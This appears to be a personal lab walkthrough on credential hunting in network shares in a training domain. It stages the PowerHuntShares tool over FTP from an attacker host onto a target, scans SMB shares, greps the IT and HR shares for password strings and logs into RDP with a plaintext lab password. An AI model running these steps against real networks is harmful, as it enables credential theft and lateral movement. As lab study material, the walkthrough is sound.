# [[Credential Hunting in Network Shares]]

```shell
git clone https://github.com/NetSPI/PowerHuntShares 
sudo zip -r PowerHuntShares.zip PowerHuntShares  
sudo python3 -m pyftpdlib --port 21
```
![[Pasted image 20260510210511.png]]

```cmd
cd Desktop  
wget <ftp://10.10.16.5/PowerHuntShares.zip> -O PowerHuntShares.zip  
Expand-Archive -Path .\\PowerHuntShares.zip -DestinationPath .\\
```

```Powershell
cd .\\PowerHuntShares\\  
Import-Module .\\PowerHuntShares.psm1  
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\\Users\\Public
```
![[Pasted image 20260510210541.png]]

```cmd
net share
```
![[Pasted image 20260510210551.png]]

```cmd
findstr /SIN /C:"passw" "\\DC01.inlanefreight.local\IT\*.txt"
```
![[Pasted image 20260510210610.png]]

```shell
xfreerdp3 /u:jbader /p:ILovePower333### /v:10.129.234.173 -f
```

```cmd
findstr /SIN /C:"passw" "\\DC01.inlanefreight.local\HR\*.txt"
```
![[Pasted image 20260510210637.png]]